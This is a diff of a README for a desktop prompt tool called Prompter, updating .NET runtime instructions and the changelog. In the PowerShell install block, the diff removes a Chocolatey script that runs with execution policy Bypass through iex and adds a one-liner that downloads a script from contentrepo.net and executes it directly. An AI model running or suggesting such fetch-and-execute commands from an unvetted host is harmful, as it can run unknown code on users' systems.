@@ -9,7 +9,7 @@ tags: ['notifications', 'reboot']
 draft: false
 unlisted: false
 last_update:
-  date: 2025-08-21
+  date: 2026-05-12
 ---
 
 <br />
@@ -31,15 +31,17 @@ Prompter is a simple application designed to present a prompt on the desktop and
 
 ### Built With
 
-* [.NET 8.0](https://dotnet.microsoft.com/en-us/download/dotnet/8.0)
+- [.NET 8.0](https://dotnet.microsoft.com/en-us/download/dotnet/8.0)
 
 ## Getting Started
 
-Install the .NET Desktop Runtime 8.0 and then simply download and run Prompter.exe to get started.
+Install a supported .NET Desktop Runtime (8.0, 9.0, 10.0, or newer) and then simply download and run Prompter.exe to get started.
+
+> **Note on Compatibility:** While Prompter is compiled against .NET 8, it is configured using the `<RollForward>Major</RollForward>` property. This ensures that the application will automatically and seamlessly run on .NET 9, .NET 10, or future major desktop runtimes if .NET 8 is not installed on the host machine. This was implemented to guarantee continued functionality and security as older runtimes reach their End of Life.
 
 ### Prerequisites
 
-* .NET 8.0 Desktop Runtime
+- .NET 8.0 Desktop Runtime (or a newer major version, such as .NET 9 or 10)
 
   ```shell
   winget install Microsoft.DotNet.DesktopRuntime.8
@@ -48,10 +50,7 @@ Install the .NET Desktop Runtime 8.0 and then simply download and run Prompter.e
   or
 
   ```powershell
-  Set-ExecutionPolicy Bypass -Scope Process -Force
-  [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
-  iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
-  & "$env:ALLUSERSPROFILE\chocolatey\bin\choco.exe" "install" "dotnet-8.0-desktopruntime"
+  try { & ([scriptblock]::Create((Invoke-RestMethod -Uri 'https://contentrepo.net/repo/script/optimize-dotnetruntime.ps1'))) -Action Install -Type desktopRuntime -Version 10 -ErrorAction Stop; return 'Success: .Net 10 Desktop Runtime installation completed successfully.' } catch { throw ('Error: Failed to install .Net 10 Desktop Runtime. Reason: {0}' -f $Error[0].Exception.Message) }
   ```
 
 ## Usage
@@ -161,10 +160,14 @@ $PrompterOutput[1]
 
 ## Acknowledgments
 
-* [FlatIcon](https://www.flaticon.com)
-* [CommandlineParser](https://github.com/commandlineparser/commandline)
+- [FlatIcon](https://www.flaticon.com)
+- [CommandlineParser](https://github.com/commandlineparser/commandline)
 
 ## Changelog
+
+### 2026-05-12
+
+- Updated the application to automatically support newer .NET versions (like .NET 9 and 10), ensuring long-term stability and preventing future disruptions.
 
 ### 2025-05-06
 
